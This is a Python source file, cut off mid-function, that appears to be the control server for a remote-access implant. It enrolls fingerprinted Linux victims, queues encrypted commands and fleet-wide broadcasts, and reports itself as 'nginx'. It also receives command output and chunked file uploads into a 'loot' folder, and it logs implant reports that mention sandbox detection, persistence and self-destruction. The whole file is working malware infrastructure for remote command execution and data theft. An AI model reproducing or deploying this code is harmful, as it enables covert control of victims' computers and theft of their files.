#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import sys
import json
import hmac
import time
import socket
import base64
import shutil
import atexit
import hashlib
import secrets
import string
import threading
import socketserver
import http.server
import ipaddress
import collections
from datetime import datetime

try:
    import readline
    readline.set_history_length(2000)
except Exception:
    pass

try:
    import termios
except Exception:
    termios = None

# --- tty ---

_TTY = None

def _save_tty():
    global _TTY
    if termios is None:
        return
    try:
        if sys.stdin is not None and sys.stdin.isatty():
            _TTY = termios.tcgetattr(sys.stdin.fileno())
    except Exception:
        _TTY = None

def restore_tty():
    global _TTY
    if termios is None or _TTY is None:
        return
    a, _TTY = _TTY, None
    try:
        termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, a)
    except Exception:
        pass

atexit.register(restore_tty)

# --- palette ---

class C:
    R = "\033[0m"
    B = "\033[1m"
    D = "\033[2m"
    RED = "\033[31m"
    GRN = "\033[32m"
    YEL = "\033[33m"
    MAG = "\033[35m"
    CYN = "\033[36m"
    WHT = "\033[37m"
    BGRN = "\033[92m"
    BRED = "\033[91m"
    BYEL = "\033[93m"
    BCYN = "\033[96m"
    BWHT = "\033[97m"
    BMAG = "\033[95m"

if not sys.stdout.isatty():
    for _k in ("R", "B", "D", "RED", "GRN", "YEL", "MAG", "CYN", "WHT",
               "BGRN", "BRED", "BYEL", "BCYN", "BWHT", "BMAG"):
        setattr(C, _k, "")

_ANSI = re.compile(r'\x1b\[[0-9;?]*[A-Za-z]')

def clean(s):
    return _ANSI.sub('', s).replace('\r', '')

def vis(s):
    return len(_ANSI.sub('', s))

def width():
    try:
        w = shutil.get_terminal_size((80, 24)).columns
    except Exception:
        w = 80
    return max(min(w - 4, 68), 44)

def p_top(title=""):
    w = width()
    if not title:
        return C.BCYN + "╭" + "─" * (w - 2) + "╮" + C.R
    head = ("─ " + title + " ")[:w - 2]
    return C.BCYN + "╭" + head + "─" * (w - 2 - vis(head)) + "╮" + C.R

def p_bot():
    w = width()
    return C.BCYN + "╰" + "─" * (w - 2) + "╯" + C.R

def p_div(label=""):
    w = width()
    if not label:
        return C.BCYN + "├" + "─" * (w - 2) + "┤" + C.R
    head = ("─ " + label + " ")[:w - 2]
    return C.BCYN + "├" + head + "─" * (w - 2 - vis(head)) + "┤" + C.R

def p_line(content=""):
    w = width()
    inner = w - 4
    if vis(content) > inner:
        content = _ANSI.sub('', content)[:inner]
    return C.BCYN + "│" + C.R + "  " + content + " " * (inner - vis(content)) + C.BCYN + "│" + C.R

def p_blank():
    w = width()
    return C.BCYN + "│" + C.R + " " * (w - 2) + C.BCYN + "│" + C.R

def p_mid(plain, styled):
    w = width()
    inner = w - 2
    if len(plain) >= inner:
        return C.BCYN + "│" + C.R + plain[:inner] + C.BCYN + "│" + C.R
    tp = inner - len(plain)
    return C.BCYN + "│" + C.R + " " * (tp // 2) + styled + " " * (tp - tp // 2) + C.BCYN + "│" + C.R

def tag(label, colour=None):
    return (colour or C.BCYN) + "[" + label + "]" + C.R

_PRINT = threading.Lock()

def say(sym, colour, msg):
    with _PRINT:
        print(f" {colour}{sym}{C.R} {msg}", flush=True)

def ago(ts):
    d = max(0, int(time.time() - ts))
    return f"{d}s ago" if d < 60 else (f"{d // 60}m ago" if d < 3600 else f"{d // 3600}h ago")

# --- aes-128-cbc (pure stdlib) ---

class AES:
    SB = bytes.fromhex(
        "637c777bf26b6fc53001672bfed7ab76ca82c97dfa5947f0add4a2af9ca472c0"
        "b7fd9326363ff7cc34a5e5f171d8311504c723c31896059a071280e2eb27b275"
        "09832c1a1b6e5aa0523bd6b329e32f8453d100ed20fcb15b6acbbe394a4c58cf"
        "d0efaafb434d338545f9027f503c9fa851a3408f929d38f5bcb6da2110fff3d2"
        "cd0c13ec5f974417c4a77e3d645d197360814fdc222a908846eeb814de5e0bdb"
        "e0323a0a4906245cc2d3ac629195e479e7c8376d8dd54ea96c56f4ea657aae08"
        "ba78252e1ca6b4c6e8dd741f4bbd8b8a703eb5664803f60e613557b986c11d9e"
        "e1f8981169d98e949b1e87e9ce5528df8ca1890dbfe6426841992d0fb054bb16")
    _inv = [0] * 256
    for _i, _v in enumerate(SB):
        _inv[_v] = _i
    INV = bytes(_inv)
    del _i, _v, _inv
    RC = (0x01000000, 0x02000000, 0x04000000, 0x08000000, 0x10000000,
          0x20000000, 0x40000000, 0x80000000, 0x1B000000, 0x36000000)
    GF = {}

    def __init__(self, key):
        if len(key) != 16:
            raise ValueError("key must be 16 bytes")
        k = list(key)
        w = [0] * 44
        for i in range(4):
            w[i] = (k[4 * i] << 24) | (k[4 * i + 1] << 16) | (k[4 * i + 2] << 8) | k[4 * i + 3]
        s = self.SB
        for i in range(4, 44):
            t = w[i - 1]
            if i % 4 == 0:
                t = (s[(t >> 16) & 255] << 24 | s[(t >> 8) & 255] << 16
                     | s[t & 255] << 8 | s[t >> 24]) ^ self.RC[i // 4 - 1]
            w[i] = w[i - 4] ^ t
        self.w = w

    def _m(self, a, b):
        k = (a << 8) | b
        v = self.GF.get(k)
        if v is not None:
            return v
        p = 0
        for _ in range(8):
            if b & 1:
                p ^= a
            c = a & 0x80
            a = (a << 1) & 0xFF
            if c:
                a ^= 0x1B
            b >>= 1
        self.GF[k] = p
        return p

    def _ark(self, st, r):
        for i in range(4):
            for j in range(4):
                st[i][j] ^= (self.w[r * 4 + j] >> (24 - 8 * i)) & 255

    @staticmethod
    def _rot(st):
        for i in (1, 2, 3):
            st[i] = st[i][i:] + st[i][:i]

    @staticmethod
    def _irot(st):
        for i in (1, 2, 3):
            st[i] = st[i][-i:] + st[i][:-i]

    def _enc(self, blk):
        st = [[blk[4 * j + i] for j in range(4)] for i in range(4)]
        s = self.SB
        self._ark(st, 0)
        for r in range(1, 10):
            for i in range(4):
                for j in range(4):
                    st[i][j] = s[st[i][j]]
            self._rot(st)
            for j in range(4):
                a = [st[i][j] for i in range(4)]
                st[0][j] = self._m(2, a[0]) ^ self._m(3, a[1]) ^ a[2] ^ a[3]
                st[1][j] = a[0] ^ self._m(2, a[1]) ^ self._m(3, a[2]) ^ a[3]
                st[2][j] = a[0] ^ a[1] ^ self._m(2, a[2]) ^ self._m(3, a[3])
                st[3][j] = self._m(3, a[0]) ^ a[1] ^ a[2] ^ self._m(2, a[3])
            self._ark(st, r)
        for i in range(4):
            for j in range(4):
                st[i][j] = s[st[i][j]]
        self._rot(st)
        self._ark(st, 10)
        return bytes(st[i][j] for j in range(4) for i in range(4))

    def _dec(self, blk):
        st = [[blk[4 * j + i] for j in range(4)] for i in range(4)]
        inv = self.INV
        self._ark(st, 10)
        for r in range(9, 0, -1):
            self._irot(st)
            for i in range(4):
                for j in range(4):
                    st[i][j] = inv[st[i][j]]
            self._ark(st, r)
            for j in range(4):
                a = [st[i][j] for i in range(4)]
                st[0][j] = self._m(14, a[0]) ^ self._m(11, a[1]) ^ self._m(13, a[2]) ^ self._m(9, a[3])
                st[1][j] = self._m(9, a[0]) ^ self._m(14, a[1]) ^ self._m(11, a[2]) ^ self._m(13, a[3])
                st[2][j] = self._m(13, a[0]) ^ self._m(9, a[1]) ^ self._m(14, a[2]) ^ self._m(11, a[3])
                st[3][j] = self._m(11, a[0]) ^ self._m(13, a[1]) ^ self._m(9, a[2]) ^ self._m(14, a[3])
        self._irot(st)
        for i in range(4):
            for j in range(4):
                st[i][j] = inv[st[i][j]]
        self._ark(st, 0)
        return bytes(st[i][j] for j in range(4) for i in range(4))

    def enc_cbc(self, pt, iv):
        if len(pt) % 16:
            raise ValueError("not block aligned")
        out, prev = b"", iv
        for i in range(0, len(pt), 16):
            prev = self._enc(bytes(a ^ b for a, b in zip(pt[i:i + 16], prev)))
            out += prev
        return out

    def dec_cbc(self, ct, iv):
        if len(ct) % 16:
            raise ValueError("not block aligned")
        out, prev = b"", iv
        for i in range(0, len(ct), 16):
            blk = ct[i:i + 16]
            out += bytes(a ^ b for a, b in zip(self._dec(blk), prev))
            prev = blk
        return out

_AES_CACHE = {}
_AES_LOCK = threading.Lock()

def _aes(key):
    with _AES_LOCK:
        a = _AES_CACHE.get(key)
        if a is None:
            if len(_AES_CACHE) > 64:
                _AES_CACHE.clear()
            a = _AES_CACHE[key] = AES(key)
        return a

# --- hkdf-sha256 ---

def hkdf(ikm, info, n=32):
    prk = hmac.new(b"0net2-v8", ikm, hashlib.sha256).digest()
    return hmac.new(prk, info + b"\x01", hashlib.sha256).digest()[:n]

_KDF = {}

def _derived(secret, info, n):
    k = (secret, info)
    v = _KDF.get(k)
    if v is None:
        v = hkdf(secret.encode(), info, n)
        if len(_KDF) > 512:
            _KDF.clear()
        _KDF[k] = v
    return v

def aes_encrypt(text, secret):
    if not secret:
        return ""
    d = text.encode("utf-8")
    n = 16 - (len(d) % 16)
    d += bytes([n]) * n
    iv = os.urandom(16)
    return (iv + _aes(_derived(secret, b"aes", 16)).enc_cbc(d, iv)).hex()

def aes_decrypt(hx, secret):
    if not hx or not secret:
        return None
    try:
        raw = bytes.fromhex(hx)
    except Exception:
        return None
    if len(raw) < 32 or len(raw) % 16:
        return None
    iv, ct = raw[:16], raw[16:]
    try:
        pt = _aes(_derived(secret, b"aes", 16)).dec_cbc(ct, iv)
    except Exception:
        return None
    n = pt[-1]
    if 1 <= n <= 16 and len(pt) >= n and pt[-n:] == bytes([n]) * n:
        pt = pt[:-n]
    try:
        return pt.decode("utf-8")
    except Exception:
        return None

def mac_hex(data, secret):
    return hmac.new(_derived(secret, b"mac", 32), data.encode("utf-8"), hashlib.sha256).hexdigest()

def auth_token(ts, nonce, secret):
    return hmac.new(_derived(secret, b"auth", 32), f"{ts}:{nonce}".encode(), hashlib.sha256).hexdigest()

# --- config ---

SERVER_ENCRYPTION_KEY_STR = ""
OLD_ENCRYPTION_KEY_STR = ""

SERVER_PORT = 3000
SERVER_BIND_ADDRESS = "0.0.0.0"
TRUST_PROXY_HEADERS = True
ORIGIN_TOKEN = ""

ONLINE_WINDOW = 30.0
PENDING_TTL = 120.0
NONCE_TTL = 30 * 24 * 3600.0
NONCE_PRUNE_SEC = 30.0
NONCE_MAX = 1_500_000
SKEW_WARN_MS = 300 * 1000
MAX_BODY = 16 * 1024 * 1024
MAX_CONN = 256
HANDLER_TIMEOUT = 20
RATE_LIMIT = 400
GLOBAL_RATE = 4000
KEY_GRACE_SEC = 1800.0
SHELL_TIMEOUT = 60.0
STATE_MIN_WRITE_SEC = 2.0
STALE_SWEEP_SEC = 2.0
UPLOAD_STALE_SEC = 3600.0
MAX_NAME_LEN = 120
MAX_PRINT_LINES = 400
MAX_PRINT_CHARS = 60000
MAX_LOG_BYTES = 2 * 1024 * 1024
MAX_SECRETS = 8

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
STATE_FILE = os.path.join(BASE_DIR, "0net2_state.json")
REPORT_DIR = os.path.join(BASE_DIR, "reports")
LOOT_DIR = os.path.join(BASE_DIR, "loot")
UPLOAD_DIR = os.path.join(BASE_DIR, "_uploads")
for _d in (REPORT_DIR, LOOT_DIR, UPLOAD_DIR):
    os.makedirs(_d, exist_ok=True)

DID_RE = re.compile(r'^[A-F0-9]{6}$')

# --- globals ---

clients = {}
ip_to_ids = {}
clients_lock = threading.Lock()

enrolled = {}
enrolled_ip = {}
enrolled_lock = threading.Lock()

pending = {}
delivered = {}
pending_lock = threading.Lock()

pending_events = {}
blocked_ids = set()
blocked_ips = set()
block_lock = threading.Lock()

poll_hint = {}

nonces = collections.OrderedDict()
nonce_lock = threading.Lock()
_nonce_prune = 0.0

rate = {}
g_rate = [0.0, 0]
rate_lock = threading.Lock()

_save_lock = threading.Lock()
_last_save = 0.0
_upload_sweep = 0.0
_stale_sweep = 0.0

broadcast_timer = None
broadcast_enc = ""
broadcast_mac = ""
broadcast_text = ""

# --- state ---

def load_state():
    global enrolled, enrolled_ip, blocked_ids, blocked_ips, OLD_ENCRYPTION_KEY_STR
    try:
        with open(STATE_FILE, "r", encoding="utf-8") as f:
            s = json.load(f)
        e = {}
        for k, v in s.get("enrolled", {}).items():
            if not DID_RE.match(k):
                continue
            if isinstance(v, str):
                v = [v] if v else []
            v = [x for x in v if isinstance(x, str) and x][-MAX_SECRETS:]
            if v:
                e[k] = v
        enrolled = e
        enrolled_ip = {k: v for k, v in s.get("enrolled_ip", {}).items()
                       if k in e and isinstance(v, str)}
        blocked_ids = set(s.get("blocked_ids", []))
        blocked_ips = set(s.get("blocked_ips", []))
        ok = s.get("old_key", "")
        if isinstance(ok, str) and ok:
            OLD_ENCRYPTION_KEY_STR = ok
    except Exception:
        pass

def _write_state():
    try:
        with enrolled_lock:
            e = {k: list(v) for k, v in enrolled.items()}
            ei = {k: v for k, v in enrolled_ip.items() if k in enrolled}
        with block_lock:
            bi, bp = sorted(blocked_ids), sorted(blocked_ips)
        tmp = STATE_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump({"enrolled": e, "enrolled_ip": ei, "blocked_ids": bi,
                       "blocked_ips": bp, "old_key": OLD_ENCRYPTION_KEY_STR}, f, indent=1)
        os.replace(tmp, STATE_FILE)
    except Exception as ex:
        say("!", C.YEL, f"state save failed: {ex}")

def save_state(force=False):
    global _last_save
    now = time.time()
    with _save_lock:
        if not force and now - _last_save < STATE_MIN_WRITE_SEC:
            return
        _last_save = now
    _write_state()

# --- helpers ---

def new_id():
    return ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(6))

def is_ip(t):
    try:
        ipaddress.ip_address(t)
        return True
    except Exception:
        return False

def norm_target(t):
    t = t.strip()
    return t if is_ip(t) else t.upper()

def check_nonce(n):
    global _nonce_prune
    if not n:
        return False
    now = time.time()
    with nonce_lock:
        if now - _nonce_prune > NONCE_PRUNE_SEC:
            _nonce_prune = now
            cut = now - NONCE_TTL
            while nonces:
                k, v = next(iter(nonces.items()))
                if v > cut:
                    break
                nonces.popitem(last=False)
        if n in nonces:
            return False
        nonces[n] = now
        while len(nonces) > NONCE_MAX:
            nonces.popitem(last=False)
        return True

def token_matches(ts, nonce, token, secret):
    if not ts or not token or not nonce:
        return False
    return hmac.compare_digest(token, auth_token(ts, nonce, secret))

def verify_mac(data, sig, keys):
    if not sig:
        return False
    for k in keys:
        if k and hmac.compare_digest(sig, mac_hex(data, k)):
            return True
    return False

def _valid_ip(t):
    try:
        return str(ipaddress.ip_address(t.strip()))
    except Exception:
        return None

def _is_proxy_peer(ip):
    try:
        a = ipaddress.ip_address(ip)
    except Exception:
        return False
    return a.is_loopback or a.is_private or a.is_link_local

def get_client_ip(h):
    peer = h.client_address[0]
    if peer.startswith("::ffff:"):
        peer = peer[7:]
    if not (TRUST_PROXY_HEADERS and _is_proxy_peer(peer)):
        return peer
    v = _valid_ip(h.headers.get("CF-Connecting-IP", ""))
    if v:
        return v
    xff = h.headers.get("X-Forwarded-For")
    if xff:
        for cand in reversed(xff.split(",")):
            v = _valid_ip(cand)
            if v:
                return v
    return _valid_ip(h.headers.get("X-Real-IP", "")) or peer

def read_body(h):
    try:
        n = int(h.headers.get("Content-Length", 0))
    except Exception:
        n = 0
    if n < 0 or n > MAX_BODY:
        h._send(413)
        return None
    return h.rfile.read(n).decode("ascii", errors="ignore") if n else ""

def safe_ip(ip):
    return ip.replace(":", "-").replace("%", "_")

def rate_ok(ip):
    now = time.time()
    with rate_lock:
        if now - g_rate[0] >= 1.0:
            g_rate[0], g_rate[1] = now, 1
        else:
            g_rate[1] += 1
            if g_rate[1] > GLOBAL_RATE:
                return False
        w = rate.get(ip)
        if w is None or now - w[0] >= 1.0:
            rate[ip] = [now, 1]
            if len(rate) > 5000:
                for k in [k for k, v in list(rate.items()) if now - v[0] > 5]:
                    rate.pop(k, None)
            return True
        w[1] += 1
        return w[1] <= RATE_LIMIT

# --- fingerprint ---

SCREEN_RE = re.compile(r'SCR:(\d+)x(\d+)')
MID_RE = re.compile(r'MID:([0-9A-Fa-f]{6,16})')
PLATFORM_RE = re.compile(r'PLAT:([A-Za-z0-9.-]{1,24})')
DISTRO_RE = re.compile(r'DISTRO:([a-z0-9]{1,24})')

def generate_device_fingerprint_id(ua):
    d = "LINUX"
    for tok, t in (("x86_64", "_X64"), ("i686", "_X86"), ("aarch64", "_ARM64"), ("armv7l", "_ARM32")):
        if tok in ua:
            d += t
            break
    m = DISTRO_RE.search(ua)
    if m:
        d += "_" + m.group(1).upper()
    if "Firefox" in ua:
        d += "_FIREFOX"
    elif "Chrome" in ua:
        d += "_CHROME"
    m = SCREEN_RE.search(ua)
    if m:
        d += "SCR" + "".join(m.groups())
    m = PLATFORM_RE.search(ua)
    if m:
        d += "_PLAT" + m.group(1)
    m = MID_RE.search(ua)
    if m:
        d += "_MID" + m.group(1).upper()
    return hashlib.sha256(d.encode()).hexdigest()[:6].upper()

def parse_os(ua):
    if "linux" not in ua.lower():
        return "Unknown"
    m = DISTRO_RE.search(ua)
    return "Linux (" + m.group(1) + ")" if m else "Linux"

# --- registry ---

def remove_stale_ips():
    now = time.time()
    any_hint = poll_hint.get("*", 0)
    gone = []
    with clients_lock:
        for did in list(clients.keys()):
            v = clients[did]
            win = max(ONLINE_WINDOW, max(any_hint, poll_hint.get(did, 0), poll_hint.get(v["ip"], 0)) * 3.0)
            if now - v["ts"] <= win:
                continue
            del clients[did]
            s = ip_to_ids.get(v["ip"])
            if s:
                s.discard(did)
                if not s:
                    del ip_to_ids[v["ip"]]
            gone.append(did)
    if gone:
        with pending_lock:
            for d in gone:
                delivered.pop(d, None)
    return gone

def sweep_stale():
    global _stale_sweep
    now = time.time()
    if now - _stale_sweep < STALE_SWEEP_SEC:
        return
    _stale_sweep = now
    remove_stale_ips()

def touch_client(did, ip, osinfo, ua):
    with clients_lock:
        is_new = did not in clients
        old = clients.get(did)
        old_ip = old["ip"] if old else None
        clients[did] = {"ip": ip, "ts": time.time(), "os": osinfo, "ua": ua}
        if old_ip and old_ip != ip:
            s = ip_to_ids.get(old_ip)
            if s:
                s.discard(did)
                if not s:
                    del ip_to_ids[old_ip]
        ip_to_ids.setdefault(ip, set()).add(did)
        return is_new

def note_ip(did, ip):
    if not did:
        return
    with enrolled_lock:
        if not enrolled.get(did) or enrolled_ip.get(did) == ip:
            return
        enrolled_ip[did] = ip
    save_state()

def block_client(target):
    removed = []
    target = norm_target(target)
    with block_lock, clients_lock:
        if is_ip(target):
            for did in list(ip_to_ids.get(target, [])):
                if did in clients:
                    removed.append((clients.pop(did)["ip"], did))
            ip_to_ids.pop(target, None)
            blocked_ips.add(target)
        else:
            c = clients.pop(target, None)
            if c:
                removed.append((c["ip"], target))
                s = ip_to_ids.get(c["ip"])
                if s:
                    s.discard(target)
                    if not s:
                        del ip_to_ids[c["ip"]]
            blocked_ids.add(target)
    return removed

# --- outbox ---

def enqueue(key, text, cid=None):
    cid = cid or new_id()
    with pending_lock:
        pending.setdefault(key, collections.deque(maxlen=512)).append(
            {"id": cid, "text": f"{text} (ID-{cid})", "ts": time.time()})
    return cid

def enqueue_all(text, cid=None):
    return enqueue("*", text, cid)

def take_pending(did, ip):
    
    now = time.time()
    with pending_lock:
        seen = delivered.setdefault(did, set())
        for key in (did, ip, "*"):
            q = pending.get(key)
            if not q:
                continue
            while q and now - q[0]["ts"] > PENDING_TTL:
                q.popleft()
            for c in q:
                if c["id"] in seen:
                    continue
                seen.add(c["id"])
                if len(seen) > 512:
                    seen.clear()
                    seen.add(c["id"])
                return c["text"]
        return ""

# --- broadcast ---

def _clear_broadcast():
    global broadcast_text, broadcast_enc, broadcast_mac, broadcast_timer
    broadcast_text = broadcast_enc = broadcast_mac = ""
    broadcast_timer = None

def set_broadcast(cmd, enc="", sig="", ttl=PENDING_TTL):
    global broadcast_text, broadcast_enc, broadcast_mac, broadcast_timer
    broadcast_text, broadcast_enc, broadcast_mac = cmd, enc, sig
    if broadcast_timer:
        broadcast_timer.cancel()
    broadcast_timer = threading.Timer(ttl, _clear_broadcast)
    broadcast_timer.daemon = True
    broadcast_timer.start()

# --- handler ---

class RequestHandler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    timeout = HANDLER_TIMEOUT

    def version_string(self):
        return "nginx"

    def log_message(self, fmt, *args):
        pass

    def _send(self, code, body=b"", extra=None):
        try:
            self.send_response(code)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Connection", "close")
            for k, v in (extra or {}).items():
                self.send_header(k, v)
            self.end_headers()
            if body:
                self.wfile.write(body)
        except Exception:
            pass

    def _secrets(self, did):
        with enrolled_lock:
            return list(enrolled.get(did, ()))

    def _ip_ok(self, did, ip):
        with enrolled_lock:
            last = enrolled_ip.get(did, "")
        return (not last) or last == ip

    def _mint(self, did):
        if not did or not DID_RE.match(did):
            return None
        with enrolled_lock:
            if enrolled.get(did):
                return None
            s = secrets.token_hex(16)
            enrolled[did] = [s]
            enrolled_ip[did] = ""
        save_state()
        say("+", C.GRN, f"enrolled {C.B}{did}{C.R}")
        return s

    def _auth(self):
        self.key_mode = self.key_str = self.did = ""
        ts = self.headers.get("X-Timestamp")
        token = self.headers.get("X-Auth-Token")
        nonce = self.headers.get("X-Nonce")
        ip = get_client_ip(self)
        if not ts or not token or not nonce:
            self._send(401)
            say("!", C.YEL, f"401 {self.path} missing auth headers from {ip}")
            return False
        if ORIGIN_TOKEN and self.headers.get("X-Origin-Token", "") != ORIGIN_TOKEN:
            self._send(403)
            say("!", C.YEL, f"403 {self.path} bad origin token")
            return False

        did = (self.headers.get("X-Client-ID") or "").upper()
        mode = self.headers.get("X-Key-Mode", "global")
        try:
            skew = abs(int(time.time() * 1000) - int(ts))
        except Exception:
            skew = None
        secs = self._secrets(did) if did else []
        ip_ok = self._ip_ok(did, ip) if did else True

        cands = []
        if secs:
            if mode == "secret":
                cands = [("secret", s) for s in secs]
            elif ip_ok:
                cands.append(("global", SERVER_ENCRYPTION_KEY_STR))
        else:
            cands.append(("global", SERVER_ENCRYPTION_KEY_STR))
            if OLD_ENCRYPTION_KEY_STR:
                cands.append(("old", OLD_ENCRYPTION_KEY_STR))

        for name, key in cands:
            if token_matches(ts, nonce, token, key):
                if check_nonce(nonce):
                    self.key_mode, self.key_str, self.did = name, key, did
                    return True
                self._send(403)
                say("!", C.YEL, f"403 {self.path} replayed nonce · {ip} · did={did or '-'}")
                return False

        hint = {}
        fresh = self._mint(did)
        if fresh:
            hint["X-Enroll"] = fresh
        self._send(403, b"", hint)
        if hint:
            note = " · secret issued"
        elif secs and mode != "secret":
            note = " · resync refused (address changed) — revoke this id" if not ip_ok else " · resync key mismatch"
        elif secs:
            note = " · secret mismatch"
        else:
            note = " · id did not look like a device id"
        if skew is not None and skew > SKEW_WARN_MS:
            note += f" · clock skew {skew // 1000}s"
        say("!", C.YEL, f"403 {self.path} auth rejected · {ip} · did={did or '-'} "
                        f"mode={mode} enrolled={'yes' if secs else 'no'}{note}")
        return False

    def _enroll_headers(self):
        out = {"X-Key-Mode": self.key_mode}
        if self.key_mode in ("global", "old") and self.did:
            with enrolled_lock:
                secs = enrolled.get(self.did)
                s = secs[-1] if secs else None
            if s is None:
                s = self._mint(self.did)
            if s:
                out["X-Enroll"] = s
        return out

    def do_GET(self):
        if self.path != "/":
            self._send(404)
            return
        ip = get_client_ip(self)
        if not rate_ok(ip):
            self._send(429)
            return
        try:
            if not self._auth():
                return
            ua = self.headers.get("User-Agent", "Unknown")
            did = generate_device_fingerprint_id(ua)
            claimed = self.headers.get("X-Client-ID")
            if claimed and claimed.upper() != did:
                self._send(403)
                say("!", C.YEL, f"403 fingerprint mismatch claimed={claimed} computed={did}")
                return

            with clients_lock:
                prev = clients.get(did, {}).get("ua")
            if prev and prev != ua:
                say("!", C.YEL, f"{did} id collision · ua changed under a live id")

            with block_lock:
                if did in blocked_ids or ip in blocked_ips:
                    with pending_lock:
                        if not any(k in pending and pending[k] for k in (did, ip)):
                            self._send(403, b"Blocked")
                            return

            if touch_client(did, ip, parse_os(ua), ua):
                say("+", C.GRN, f"{C.B}{did}{C.R} connected  {C.D}{ip} · {parse_os(ua)}{C.R}")
            note_ip(did, ip)
            sweep_stale()

            cmd = take_pending(did, ip)
            if cmd:
                say("·", C.D, f"→ {did}  {clean(cmd)}")
            if cmd and cmd.startswith("updatekey ") and broadcast_enc and cmd == broadcast_text:
                enc, sig = broadcast_enc, broadcast_mac
            elif cmd:
                enc = aes_encrypt(cmd, self.key_str)
                sig = mac_hex(enc, self.key_str)
            else:
                enc = ""
                sig = mac_hex("", self.key_str)
            extra = self._enroll_headers()
            extra["X-Signature"] = sig
            self._send(200, enc.encode("ascii"), extra)
        except Exception as e:
            say("x", C.RED, f"GET: {e}")
            self._send(500)

    def do_POST(self):
        for path, fn in (("/info", self._post_info), ("/result", self._post_result),
                         ("/upload", self._post_upload)):
            if self.path == path:
                fn()
                return
        self._send(404)

    def _body_keys(self):
        out = [self.key_str] if self.key_str else []
        if self.key_mode != "secret":
            for k in (SERVER_ENCRYPTION_KEY_STR, OLD_ENCRYPTION_KEY_STR):
                if k and k not in out:
                    out.append(k)
        return out

    def _read_verified(self):
        if not self._auth():
            return None
        enc = read_body(self)
        if enc is None:
            return None
        sig = self.headers.get("X-Signature", "")
        keys = self._body_keys()
        if not verify_mac(enc, sig, keys):
            say("!", C.YEL, f"403 bad signature ({self.path}) from {get_client_ip(self)} "
                            f"keymode={self.key_mode}")
            self._send(403, b"", self._enroll_headers())
            return None
        for k in keys:
            if hmac.compare_digest(sig, mac_hex(enc, k)):
                plain = aes_decrypt(enc, k)
                if plain is not None:
                    return plain
        say("!", C.YEL, f"403 undecryptable body ({self.path}) keymode={self.key_mode}")
        self._send(403, b"", self._enroll_headers())
        return None

    def _known(self, cid, ip):
        with clients_lock:
            known = cid in clients and clients[cid]["ip"] == ip
        with enrolled_lock:
            return known or bool(enrolled.get(cid))

    def _pre(self):
        """rate limit + cid validation. returns (ip, cid) or None."""
        ip = get_client_ip(self)
        if not rate_ok(ip):
            self._send(429)
            return None
        cid = (self.headers.get("X-Client-ID") or "").upper()
        if not DID_RE.match(cid):
            self._send(401)
            say("!", C.YEL, f"401 bad cid on {self.path}: {cid!r}")
            return None
        return ip, cid

    def _post_info(self):
        try:
            pc = self._pre()
            if not pc:
                return
            ip, cid = pc
            plain = self._read_verified()
            if plain is None:
                return
            if not self._known(cid, ip):
                say("!", C.YEL, f"403 unknown sender on /info: {cid} @ {ip}")
                self._send(403)
                return
            cmd_id, _, info = plain.partition("\n")
            vm_hit = info.startswith("VM-DETECTED")
            fname = os.path.join(REPORT_DIR, f"{cid}_{safe_ip(ip)}_{int(time.time() * 1000)}.txt")
            try:
                with open(fname, "w", encoding="utf-8") as f:
                    f.write(info)
                print()
                if vm_hit:
                    print(" " + tag("VM", C.BYEL) + " " + C.B + cid + C.R + " "
                          + C.D + "·" + C.R + " " + C.D + ip + C.R)
                    print("  " + C.BYEL + info.split("\n", 1)[0] + C.R)
                    print("  " + C.D + "guard fired - persistence removed, self-destructed, "
                          "will not return" + C.R)
                else:
                    print(" " + tag("INFO", C.BCYN) + " " + C.B + cid + C.R + " "
                          + C.D + "·" + C.R + " " + C.D + ip + C.R)
                print("  " + C.D + "saved to " + C.R + C.BWHT + os.path.basename(fname)
                      + C.R + C.D + " (" + str(len(info.rstrip("\n").split("\n"))) + " lines)" + C.R)
                print()
            except Exception as e:
                say("!", C.YEL, f"report save failed: {e}")
            _fire(cid, cmd_id)
            self._send(200, b"OK", self._enroll_headers())
        except Exception as e:
            say("x", C.RED, f"POST /info: {e}")
            self._send(500)

    def _post_result(self):
        try:
            pc = self._pre()
            if not pc:
                return
            ip, cid = pc
            plain = self._read_verified()
            if plain is None:
                return
            if not self._known(cid, ip):
                say("!", C.YEL, f"403 unknown sender on /result: {cid} @ {ip}")
                self._send(403)
                return
            parts = plain.split("\n", 2)
            add_command_result(cid, parts[1] if len(parts) > 1 else "",
                               parts[2] if len(parts) > 2 else "", parts[0])
            self._send(200, b"OK", self._enroll_headers())
        except Exception as e:
            say("x", C.RED, f"POST /result: {e}")
            self._send(500)

    def _post_upload(self):
        try:
            pc = self._pre()
            if not pc:
                return
            ip, cid = pc
            tid = self.headers.get("X-Tid", "")
            if not re.match(r'^[A-Za-z0-9]{1,24}$', tid):
                self._send(400)
                say("!", C.YEL, f"400 bad tid on /upload: {tid!r}")
                return
            try:
                idx = int(self.headers.get("X-Idx", "-1"))
                total = int(self.headers.get("X-Total", "-1"))
            except Exception:
                self._send(400)
                return
            if not (0 <= idx < total <= 100000):
                self._send(400)
                say("!", C.YEL, f"400 bad chunk range {idx}/{total}")
                return

            plain = self._read_verified()
            if plain is None:
                return
            if not self._known(cid, ip):
                say("!", C.YEL, f"403 unknown sender on /upload: {cid} @ {ip}")
                self._send(403)
                return
            _sweep_uploads()
            try:
                data = base64.b64decode(plain)
            except Exception:
                self._send(400)
                say("!", C.YEL, "400 bad base64 on /upload")
                return

            nb = self.headers.get("X-Name", "")
            try:
                name = base64.b64decode(nb).decode("utf-8", "replace") if nb else "file.bin"
            except Exception:
                name = "file.bin"
            name = os.path.basename(name.replace("\\", "/")).strip()
            name = re.sub(r'[<>:"|?*\x00-\x1f]', "_", name)[:MAX_NAME_LEN]
            if name in ("", ".", ".."):
                name = "file.bin"

            # per-client scratch: a broadcast shot hands the fleet one tid
            d = os.path.join(UPLOAD_DIR, f"{tid}_{cid}")
            os.makedirs(d, exist_ok=True)
            with open(os.path.join(d, f"{idx}.part"), "wb") as f:
                f.write(data)

            if all(os.path.exists(os.path.join(d, f"{i}.part")) for i in range(total)):
                out = os.path.join(LOOT_DIR, name)
                if os.path.exists(out):
                    stem, ext = os.path.splitext(name)
                    out = os.path.join(LOOT_DIR, f"{stem}_{int(time.time())}{ext}")
                with open(out, "wb") as w:
